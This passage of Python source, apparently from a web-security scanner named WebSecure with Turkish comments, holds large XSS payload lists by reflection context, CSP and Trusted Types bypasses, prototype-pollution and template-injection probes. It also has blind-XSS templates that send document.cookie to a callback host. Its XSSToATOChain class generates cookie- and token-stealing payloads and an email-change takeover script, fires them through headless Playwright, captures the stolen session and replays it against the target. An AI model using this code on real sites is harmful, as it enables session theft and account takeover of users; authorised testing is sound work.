                    f"Payload reflected in form response (confidence={hit_confidence}, "
                    f"executable={executable})"
                ),
                detection_method=hit.get("detection_method", "reflection_form"),
                confidence=hit_confidence,
                **{k: v for k, v in hit.items() if k not in ("confidence", "detection_method")},
            )


def run(url, session=None, results=None, debug=False, oast_domain: str = None, **kwargs):
    scanner = XSSScanner(session, results, debug, oast_domain=oast_domain)
    scanner.run(url, results=results, **kwargs)


# ===========================================================================
# MERGED FROM: websecure/core/reflection.py
# Adaptive Reflection Analyzer — context-aware XSS payload selection
# ===========================================================================
"""
Adaptive Reflection Analyzer for WebSecure (Level 3)

Bu modül, bir input'un HTTP yanıtında nereye yansıdığını (HTML Body, Attribute, Script vb.) analiz eder.
Bu sayede "context-aware" payload seçimi yapılabilir.
"""


class ReflectionType(Enum):
    NONE = auto()                   # Yansıma yok
    HTML_TEXT = auto()              # <div>INPUT</div>
    HTML_ATTR_DOUBLE = auto()       # <div class="INPUT">
    HTML_ATTR_SINGLE = auto()       # <div class='INPUT'>
    HTML_ATTR_UNQUOTED = auto()     # <div class=INPUT>
    SCRIPT_BLOCK = auto()           # <script>var x = "INPUT";</script>
    SCRIPT_QUOTED = auto()          # <script>var x = "INPUT";</script>
    COMMENT = auto()                # <!-- INPUT -->


@dataclass
class ReflectionPoints:
    canary: str
    contexts: List[ReflectionType]
    raw_response: str = ""


def analyze_reflection(response_text: str, canary: str) -> ReflectionPoints:
    """
    Verilen canary değerinin response içindeki konumlarını analiz eder.
    """
    if not response_text or canary not in response_text:
        return ReflectionPoints(canary, [ReflectionType.NONE], response_text)

    contexts = []

    script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', response_text, re.DOTALL | re.IGNORECASE)
    in_script = False
    for block in script_blocks:
        if canary in block:
            in_script = True
            if f'"{canary}"' in block or f"'{canary}'" in block:
                contexts.append(ReflectionType.SCRIPT_QUOTED)
            else:
                contexts.append(ReflectionType.SCRIPT_BLOCK)
            break

    if not in_script:
        if re.search(f'="[^"]*{canary}[^"]*"', response_text):
            contexts.append(ReflectionType.HTML_ATTR_DOUBLE)
        elif re.search(f"='[^']*{canary}[^']*'", response_text):
            contexts.append(ReflectionType.HTML_ATTR_SINGLE)
        elif re.search(f'=[^"\'\\s>]*{canary}[^"\'\\s>]*', response_text):
            contexts.append(ReflectionType.HTML_ATTR_UNQUOTED)
        elif re.search(f'<!--.*{canary}.*-->', response_text, re.DOTALL):
            contexts.append(ReflectionType.COMMENT)
        else:
            contexts.append(ReflectionType.HTML_TEXT)

    return ReflectionPoints(canary, list(set(contexts)), response_text)


def get_payloads_for_context(ctx: ReflectionType) -> List[str]:
    """Bulunan bağlama göre en etkili payload'ları döndürür."""
    if ctx == ReflectionType.HTML_TEXT:
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
        ]
    elif ctx == ReflectionType.HTML_ATTR_DOUBLE:
        return [
            '"><script>alert(1)</script>',
            '" onmouseover="alert(1)',
            '" autofocus onfocus="alert(1)',
        ]
    elif ctx == ReflectionType.HTML_ATTR_SINGLE:
        return [
            "'><script>alert(1)</script>",
            "' onmouseover='alert(1)",
            "' autofocus onfocus='alert(1)",
        ]
    elif ctx == ReflectionType.SCRIPT_BLOCK:
        return [
            ";alert(1);//",
            "alert(1);",
            "</script><script>alert(1)</script>",
        ]
    elif ctx == ReflectionType.SCRIPT_QUOTED:
        return [
            "';alert(1);//",
            '";alert(1);//',
            "\\';alert(1);//",
        ]
    elif ctx == ReflectionType.COMMENT:
        return ["--> <script>alert(1)</script>"]
    return []


# ===========================================================================
# Adım 4 — Advanced XSS Payload Constants
# ===========================================================================

_MXSS_PAYLOADS: List[str] = [
    # Namespace confusion / serialization differentials
    "<listing><b title=></listing><img/src onerror=alert(1)>",
    "<xmp><b title=></xmp><img/src onerror=alert(1)>",
    "<noembed><b title=></noembed><img/src onerror=alert(1)>",
    "<math><mtext><table><mglyph><style><!--</style><img/src/onerror=alert(1)>",
    "<svg><style><img/src/onerror=alert(1)>{}</style></svg>",
    "<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=</style>"
    "<img onerror=alert(1)>",
    # ForeignObject namespace confusion
    "<svg><foreignObject><div><table><tr><td>"
    "<input type=\"image\" src onerror=alert(1)></td></tr></table></div></foreignObject></svg>",
    # CSS animation event
    "<style>@keyframes a{}</style><b style=\"animation-name:a\" onanimationstart=\"alert(1)\">",
    # innerHTML re-serialization
    "<p style=\"font-family:'foo</p><img src=x onerror=alert(1)>'\">",
    # Template mutation
    "<template><img src=x onerror=alert(1)></template>",
]

_DOM_CLOBBERING_PAYLOADS: List[str] = [
    "<a id=defaultAnchor><a id=defaultAnchor name=body href=javascript:alert(1)>",
    "<a id=x><a id=x name=y href=javascript:alert(1)>",
    "<form id=login><input name=action value=javascript:alert(1)>",
    "<form id=config><input name=token>",
    "<form name=childNodes><input id=item>",
    "<object name=__proto__><param name=nodeType value=1>",
    "<img name=alert>",
    "<html id=x><head></head><body><a id=x href=\"javascript:alert(1)\">",
    "<img id=__proto__ name=polluted value=injected>",
]

_CSP_BYPASS_PAYLOADS: Dict[str, List[str]] = {
    "unsafe-eval": [
        "<script>eval('ale'+'rt(1)')</script>",
        "<script>setTimeout('alert(1)',0)</script>",
        "<script>Function('alert(1)')()</script>",
        "<script>setInterval('alert(1)',99999999)</script>",
    ],
    "strict-dynamic": [
        "<script>document.write('<script>alert(1)<\\/script>')</script>",
        "<script>var s=document.createElement('script');s.src='data:,alert(1)';document.head.appendChild(s)</script>",
    ],
    "jsonp": [
        "<script src='https://accounts.google.com/o/oauth2/revoke?callback=alert(1)'></script>",
        "<script src='https://maps.googleapis.com/maps/api/js?callback=alert(1)'></script>",
        "<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.6/jquery.js'></script>",
    ],
    "base-uri": [
        "<base href='https://attacker.invalid/'>",
    ],
    "object-src": [
        "<object data='javascript:alert(1)'>",
        "<embed src='javascript:alert(1)'>",
    ],
    "data-uri": [
        "<script src='data:text/javascript,alert(1)'></script>",
        "<iframe src='data:text/html,<script>alert(1)</script>'></iframe>",
    ],
}

_TRUSTED_TYPES_PAYLOADS: List[str] = [
    "<template shadowroot=open><script>alert(1)</script></template>",
    "<script>location='javascript:alert(1)'</script>",
    "<img src=x id=tt>",
    "trustedTypes.createPolicy('default',{createHTML:s=>s})",
    "<script>document.createRange().createContextualFragment('<img src=x onerror=alert(1)>')"
    ".firstChild.onerror()</script>",
]

_PROTO_POLLUTION_XSS_PAYLOADS: List[str] = [
    "__proto__[innerHTML]=<img src=x onerror=alert(1)>",
    "__proto__[src]=javascript:alert(1)",
    "__proto__[href]=javascript:alert(1)",
    "constructor[prototype][innerHTML]=<img src=x onerror=alert(1)>",
    "constructor[prototype][src]=javascript:alert(1)",
    "__proto__[html]=<img src=x onerror=alert(1)>",
    "__proto__[url]=javascript:alert(1)",
    "__proto__[template]=<img src=x onerror=alert(1)>",
    "a[__proto__][innerHTML]=<img/src/onerror=alert(1)>",
    "__proto__[defaultValue]=<img src=x onerror=alert(1)>",
]

_TEMPLATE_LITERAL_PAYLOADS: List[str] = [
    "${7*7}",
    "#{7*7}",
    "{{7*7}}",
    "${alert(1)}",
    "#{alert(1)}",
    "{{alert(1)}}",
    "<%=7*7%>",
    "<%= `alert(1)` %>",
    "${constructor.constructor('alert(1)')()}",
    "{{constructor.constructor('alert(1)')()}}",
    "${new Function('alert(1)')()}",
    "*{alert(1)}",
    "@{alert(1)}",
]

_BLIND_XSS_SCRIPT_TPL = (
    "<script>var i=new Image();"
    "i.src='http://{oob}/xss?u='+encodeURIComponent(document.URL)"
    "+'&c='+encodeURIComponent(document.cookie)"
    "+'&r='+encodeURIComponent(document.referrer);</script>"
)
_BLIND_XSS_IMG_TPL = (
    "<img src=x onerror=\"fetch('http://{oob}/xss?u='"
    "+encodeURIComponent(location.href)+'&c='"
    "+encodeURIComponent(document.cookie),{{mode:'no-cors'}})\">"
)
_BLIND_XSS_SVG_TPL = (
    "<svg onload=\"var s=document.createElement('script');"
    "s.src='http://{oob}/js/'+btoa(document.cookie);"
    "document.head.appendChild(s)\">"
)


# ===========================================================================
# Adım 4 — Advanced XSS Standalone Classes (SOLID)
# ===========================================================================

class MutationXSSProber:
    """
    mXSS: browser HTML parser differential exploitation.
    Sanitizers may normalise the payload; the browser re-parses it in mutated form.
    Single Responsibility: mutation XSS detection only.
    """
    _PAYLOADS: List[str] = _MXSS_PAYLOADS

    def probe(
        self,
        url: str,
        param: str,
        session: Any,
        inject_fn: Callable[[str, str, str], str],
        timeout: int = 8,
    ) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        _exec_sigs = ("onerror=alert", "onload=alert", "onfocus=alert", "onanimationstart=")
        for payload in self._PAYLOADS:
            try:
                injected = inject_fn(url, param, payload)
                resp = session.get(injected, timeout=timeout)
                if any(sig in resp.text for sig in _exec_sigs):
                    findings.append({
                        "vuln_type": "mXSS (Mutation XSS)",
                        "url": url,
                        "param": param,
                        "payload": payload,
                        "evidence": "mXSS execution signature detected in response",
                    })
            except Exception as _exc:
                logger.debug(f"[mXSS] probe failed for {url} param={param}: {_exc!r}")
                continue
        return findings


class DOMClobberingProber:
    """
    DOM Clobbering attack surface prober.
    Single Responsibility: test payloads that clobber global DOM properties.
    """
    _PAYLOADS: List[str] = _DOM_CLOBBERING_PAYLOADS

    def probe(
        self,
        url: str,
        param: str,
        session: Any,
        inject_fn: Callable[[str, str, str], str],
        timeout: int = 8,
    ) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for payload in self._PAYLOADS:
            try:
                injected = inject_fn(url, param, payload)
                resp = session.get(injected, timeout=timeout)
                if payload in resp.text:
                    findings.append({
                        "vuln_type": "DOM Clobbering",
                        "url": url,
                        "param": param,
                        "payload": payload,
                        "evidence": "DOM clobbering payload reflected unescaped",
                    })
            except Exception as _exc:
                logger.debug(f"[DOMClobber] probe failed for {url} param={param}: {_exc!r}")
                continue
        return findings


class CSPAnalyzer:
    """
    Content-Security-Policy header analyzer + bypass payload selector.
    Single Responsibility: CSP parsing and bypass strategy.
    Open/Closed: extend _BYPASS_MAP to add new bypass categories.
    """
    _BYPASS_MAP: Dict[str, List[str]] = _CSP_BYPASS_PAYLOADS

    def analyze(self, response: Any) -> Dict[str, Any]:
        csp_raw = (
            response.headers.get("Content-Security-Policy")
            or response.headers.get("content-security-policy")
            or ""
        )
        if not csp_raw:
            return {"present": False, "directives": {}, "raw": ""}
        directives: Dict[str, List[str]] = {}
        for part in csp_raw.split(";"):
            tokens = part.strip().split()
            if tokens:
                directives[tokens[0].lower()] = tokens[1:]
        return {"present": True, "directives": directives, "raw": csp_raw}

    def get_bypass_payloads(self, csp_info: Dict[str, Any]) -> List[str]:
        if not csp_info.get("present"):
            return []
        directives = csp_info.get("directives", {})
        script_vals = " ".join(
            directives.get("script-src", directives.get("default-src", []))
        )
        payloads: List[str] = []
        if "'unsafe-eval'" in script_vals:
            payloads.extend(self._BYPASS_MAP["unsafe-eval"])
        if "'strict-dynamic'" in script_vals:
            payloads.extend(self._BYPASS_MAP["strict-dynamic"])
        if any(d in script_vals for d in ("googleapis.com", "accounts.google.com")):
            payloads.extend(self._BYPASS_MAP["jsonp"])
        if "base-uri" not in directives:
            payloads.extend(self._BYPASS_MAP["base-uri"])
        if "object-src" not in directives:
            payloads.extend(self._BYPASS_MAP["object-src"])
        if not payloads:
            payloads.extend(self._BYPASS_MAP["data-uri"])
        # dedup preserving order
        seen: set = set()
        return [p for p in payloads if not (p in seen or seen.add(p))]  # type: ignore[func-returns-value]


class TrustedTypesBypassProber:
    """
    Trusted Types policy bypass prober.
    Single Responsibility: detect and bypass TT enforcement in modern browsers.
    """
    _PAYLOADS: List[str] = _TRUSTED_TYPES_PAYLOADS

    def probe(
        self,
        url: str,
        param: str,
        session: Any,
        inject_fn: Callable[[str, str, str], str],
        timeout: int = 8,
    ) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for payload in self._PAYLOADS:
            try:
                injected = inject_fn(url, param, payload)
                resp = session.get(injected, timeout=timeout)
                if payload in resp.text:
                    findings.append({
                        "vuln_type": "Trusted Types Bypass",
                        "url": url,
                        "param": param,
                        "payload": payload,
                        "evidence": "Trusted Types bypass payload reflected unescaped",
                    })
            except Exception as _exc:
                logger.debug(f"[TrustedTypes] probe failed for {url} param={param}: {_exc!r}")
                continue
        return findings


class PrototypePollutionXSSProber:
    """
    Prototype Pollution -> XSS gadget chain prober.
    Injects __proto__ / constructor.prototype keys into query string.
    Single Responsibility: PP-based XSS surface detection.
    """
    _PAYLOADS: List[str] = _PROTO_POLLUTION_XSS_PAYLOADS
    _XSS_SIGS = ("onerror=alert", "src=javascript:", "innerHTML", "onload=alert")

    def probe(
        self,
        url: str,
        session: Any,
        timeout: int = 8,
    ) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        parsed = urlparse(url)
        existing = parse_qsl(parsed.query)
        for payload in self._PAYLOADS:
            key, _, val = payload.partition("=")
            params = existing + [(key, val or payload)]
            test_url = urlunparse(parsed._replace(query=urlencode(params)))
            try:
                resp = session.get(test_url, timeout=timeout)
                if any(sig in resp.text for sig in self._XSS_SIGS):
                    findings.append({
                        "vuln_type": "Prototype Pollution -> XSS",
                        "url": url,
                        "param": key,
                        "payload": payload,
                        "evidence": "PP gadget XSS signature detected in response",
                    })
            except Exception as _exc:
                logger.debug(f"[PPXSSProber] probe failed for {url}: {_exc!r}")
                continue
        return findings


class TemplateLiteralInjectionProber:
    """
    Template literal / server-side expression injection prober.
    Detects ${...}, {{...}}, #{...} and <%=...%> evaluation.
    Single Responsibility: template literal injection surface only.
    """
    _PAYLOADS: List[str] = _TEMPLATE_LITERAL_PAYLOADS

    def probe(
        self,
        url: str,
        param: str,
        session: Any,
        inject_fn: Callable[[str, str, str], str],
        timeout: int = 8,
    ) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for payload in self._PAYLOADS:
            try:
                injected = inject_fn(url, param, payload)
                resp = session.get(injected, timeout=timeout)
                # Expression evaluation: 7*7 = 49
                if "49" in resp.text and "7" in payload:
                    findings.append({
                        "vuln_type": "Template Literal Injection (XSS/SSTI)",
                        "url": url,
                        "param": param,
                        "payload": payload,
                        "evidence": "Expression 7*7=49 evaluated server/client-side",
                        "confidence": "high",
                    })
                elif payload in resp.text:
                    findings.append({
                        "vuln_type": "Template Literal Injection (XSS/SSTI)",
                        "url": url,
                        "param": param,
                        "payload": payload,
                        "evidence": "Template injection payload reflected unescaped",
                        "confidence": "medium",
                    })
            except Exception as _exc:
                logger.debug(f"[TemplateLiteralInjection] probe failed for {url} param={param}: {_exc!r}")
                continue
        return findings


class BlindXSSProber:
    """
    Out-of-band Blind XSS prober.
    Sends payloads with OOB callback — actual confirmation via OAST/interactsh.
    Single Responsibility: OOB XSS payload delivery only.
    """

    def __init__(self, oob_host: Optional[str] = None) -> None:
        self.oob_host: str = oob_host or "oast.invalid"

    def get_payloads(self) -> List[str]:
        h = self.oob_host
        return [
            _BLIND_XSS_SCRIPT_TPL.format(oob=h),
            _BLIND_XSS_IMG_TPL.format(oob=h),
            _BLIND_XSS_SVG_TPL.format(oob=h),
            f"<script src='http://{h}/x.js'></script>",
            f"<iframe src='http://{h}/blind' style='display:none'></iframe>",
            f"<link rel=stylesheet href='http://{h}/css'>",
        ]

    def probe(
        self,
        url: str,
        param: str,
        session: Any,
        inject_fn: Callable[[str, str, str], str],
        timeout: int = 8,
    ) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        for payload in self.get_payloads():
            try:
                injected = inject_fn(url, param, payload)
                resp = session.get(injected, timeout=timeout)
                if resp.status_code < 400:
                    findings.append({
                        "vuln_type": "Blind XSS (OOB)",
                        "url": url,
                        "param": param,
                        "payload": payload,
                        "evidence": (
                            f"OOB payload delivered (HTTP {resp.status_code}). "
                            f"Check {self.oob_host} for callbacks."
                        ),
                        "confidence": "low",
                        "requires_oob_confirmation": True,
                    })
                    break  # one delivery per param is sufficient
            except Exception as _exc:
                logger.debug(f"[BlindXSS] probe failed for {url} param={param}: {_exc!r}")
                continue
        return findings


class XSSToATOChain:
    """
    XSS → Account Takeover gerçek execution motoru.

    DOM confirmed her XSS bulgusu için:
      1. Lokal HTTP callback sunucusu başlatır (127.0.0.1:random)
      2. Gerçek cookie/localStorage theft payload'u üretir
      3. Playwright/Selenium ile hedef sayfayı açar ve payload'u çalıştırır
      4. Sunucuya gelen callback'i bekler (timeout: 15s)
      5. Çalınan cookie'yi hedef origin'e karşı doğrular
      6. Sonucu "sessions" bucket'ına yazar
    """

    CALLBACK_TIMEOUT = 15  # saniye

    def __init__(self, session=None):
        self._session = session  # optional SmartSession for HTTP fallback

    def generate_poc(
        self,
        xss_url: str,
        param: str,
        payload: str,
        attacker_host: str = "attacker.invalid",
    ) -> Dict[str, Any]:
        """Backward-compat: PoC şablonu üret (callback sunucusu olmadan)."""
        uid = uuid.uuid4().hex[:8]
        h = attacker_host
        return {
            "vuln_type": "XSS -> Account Takeover (PoC)",
            "source_xss_url": xss_url,
            "source_param": param,
            "source_payload": payload,
            "attacker_host": h,
            "session_id": uid,
            "pocs": {
                "cookie_steal": {
                    "description": "Cookie exfiltration via fetch beacon",
                    "payload": (
                        f"<img src=x onerror=\"fetch('http://{h}/steal?s={uid}"
                        f"&c='+encodeURIComponent(document.cookie),{{mode:'no-cors'}})\">"
                    ),
                },
                "localstorage_steal": {
                    "description": "localStorage / sessionStorage token theft",
                    "payload": (
                        f"<img src=x onerror=\"var t=localStorage.getItem('token')"
                        f"||sessionStorage.getItem('token')||'';"
                        f"fetch('http://{h}/token?s={uid}&t='+encodeURIComponent(t)"
                        f",{{mode:'no-cors'}})\">"
                    ),
                },
                "account_takeover": {
                    "description": "Email-change account takeover via CSRF",
                    "payload": (
                        f"<script>fetch(location.origin+'/api/account/email',{{"
                        f"method:'POST',credentials:'include',"
                        f"headers:{{'Content-Type':'application/json'}},"
                        f"body:JSON.stringify({{email:'pwned_{uid}@{h}'"
                        f"}})}})</script>"
                    ),
                },
            },
            "severity": "Critical",
            "confidence": "high",
        }

    def execute(
        self,
        xss_url: str,
        param: str,
        xss_payload: str,
        results: Optional[Dict] = None,
        driver=None,
    ) -> Optional["CapturedSession"]:  # type: ignore[name-defined]
        """
        Gerçek cookie theft yürüt.

        Adımlar:
        1. Callback sunucusunu başlat
        2. Steal payload'unu XSS URL'sine enjekte et
        3. Playwright ile sayfayı aç (veya Selenium, veya requests)
        4. Callback bekle (15s)
        5. Session doğrula
        6. Sonucu sessions bucket'ına yaz
        """
        try:
            from websecure.core.xss_callback import (
                XSSCallbackServer, CapturedSession,
                parse_cookie_str, parse_storage_str,
            )
        except ImportError:
            logger.warning("[ATO] xss_callback modülü bulunamadı")
            return None

        srv = XSSCallbackServer()
        try:
            srv.start()
        except Exception as e:
            logger.warning(f"[ATO] Callback sunucusu başlatılamadı: {e!r}")
            return None

        try:
            token = srv.new_token()
            steal_js = srv.steal_payload(token, include_storage=True)
            img_payload = srv.steal_img_payload(token)

            # XSS URL'sine steal JS'i enjekte et
            injected_url = self._inject_payload(xss_url, param, f"<script>{steal_js}</script>")
            injected_url_img = self._inject_payload(xss_url, param, img_payload)

            logger.info(f"[ATO] Callback bekleniyor — {srv.base_url}/steal?t={token[:8]}...")

            # Yöntem 1: Playwright (en güvenilir)
            if not self._try_playwright(injected_url, steal_js):
                # Yöntem 2: Selenium driver
                if driver and not self._try_selenium(driver, injected_url):
                    # Yöntem 3: requests (sadece server-side render)
                    self._try_requests(injected_url_img)

            # Callback bekle
            raw = srv.wait(token, timeout=self.CALLBACK_TIMEOUT)
            if not raw:
                logger.info(f"[ATO] Callback gelmedi ({self.CALLBACK_TIMEOUT}s timeout) — {xss_url}")
                return None

            # Veriyi parse et
            raw_cookie = raw.get("c", "")
            cookies = parse_cookie_str(raw_cookie)
            ls = parse_storage_str(raw.get("ls", ""))
            ss = parse_storage_str(raw.get("ss", ""))
            origin = raw.get("u", xss_url)

            # Session oluştur
            sess = CapturedSession(
                token=token,
                cookies=cookies,
                local_storage=ls,
                session_storage=ss,
                raw_cookie_str=raw_cookie,
                origin_url=origin,
                xss_url=xss_url,
                xss_param=param,
                xss_payload=xss_payload,
                source="xss_dom" if driver else "xss_reflected",
            )

            # Doğrulama — çalınan cookie ile origin'e istek at
            sess = self._verify_session(sess)

            # Bucket'a yaz
            if results is not None:
                try:
                    from websecure.core.reporting import add_result
                    add_result("sessions", sess.to_dict())
                except Exception as e:
                    logger.debug(f"[ATO] add_result hatası: {e!r}")

            status = "DOĞRULANDI" if sess.verified else "yakalandı (doğrulanamadı)"
            logger.warning(
                f"[ATO] Session {status}! "
                f"URL={xss_url} param={param} "
                f"cookie_count={len(cookies)} ls_keys={len(ls)}"
            )
            return sess

        finally:
            srv.stop()

    # ------------------------------------------------------------------ #
    # Yardımcı metodlar
    # ------------------------------------------------------------------ #

    @staticmethod
    def _inject_payload(url: str, param: str, payload: str) -> str:
        """Payload'u URL parametresine enjekte et."""
        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))
        if param and param in params:
            params[param] = payload
        elif param:
            params[param] = payload
        else:
            # Parametre yoksa fragment'a ekle (DOM XSS senaryosu)
            return url + ("&" if "?" in url else "?") + f"__ws={payload}"
        return urlunparse(parsed._replace(query=urlencode(params)))

    @staticmethod
    def _try_playwright(url: str, steal_js: str) -> bool:
        """Playwright ile sayfayı aç, steal JS'i çalıştır."""
        try:
            from playwright.sync_api import sync_playwright
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True, args=["--no-sandbox"])
                ctx = browser.new_context(ignore_https_errors=True)
                page = ctx.new_page()
                try:
                    page.goto(url, timeout=10000, wait_until="domcontentloaded")
                    # Payload inject edilmemişse JS ile çalıştır
                    page.evaluate(steal_js)
                    page.wait_for_timeout(3000)  # callback için bekle
                except Exception as _fix_e:
                    logger.debug(f"[scanners.xss] {type(_fix_e).__name__}: {_fix_e!r}")
                finally:
                    browser.close()
            return True
        except Exception as e:
            logger.debug(f"[ATO] Playwright başarısız: {e!r}")
            return False

    @staticmethod
    def _try_selenium(driver, url: str) -> bool:
        """Selenium driver ile sayfayı aç."""
        try:
            driver.get(url)
            time.sleep(3)
            return True
        except Exception as e:
            logger.debug(f"[ATO] Selenium başarısız: {e!r}")
            return False

    def _try_requests(self, url: str) -> bool:
        """Requests ile URL'ye istek at (server-side render için)."""
        try:
            _getter = self._session.get if self._session is not None else _requests.Session().get
            _getter(url, timeout=5, verify=False)
            return True
        except Exception as exc:
            logger.debug("[XSS/ATO] _try_requests error: %r", exc)
            return False

    @staticmethod
    def _verify_session(sess: "CapturedSession") -> "CapturedSession":  # type: ignore[name-defined]
        """Çalınan cookie ile hedef origin'e istek at — erişim doğrula."""
        if not sess.cookies or not sess.origin_url:
            return sess
        try:
            origin = urlparse(sess.origin_url)
            base = f"{origin.scheme}://{origin.netloc}"
            # Use a fresh session with ONLY the stolen cookies (not the scan session)
            with _requests.Session() as _s:
                r = _s.get(
                    base, cookies=sess.cookies,
                    timeout=5, verify=False, allow_redirects=True,
                )
            sess.verified = r.status_code < 400
            sess.verification_url = base
            sess.verification_status = r.status_code
            logger.info(f"[ATO] Doğrulama: {base} → HTTP {r.status_code} {'OK' if sess.verified else 'FAIL'}")
        except Exception as e:
            logger.debug(f"[ATO] Doğrulama hatası: {e!r}")
        return sess
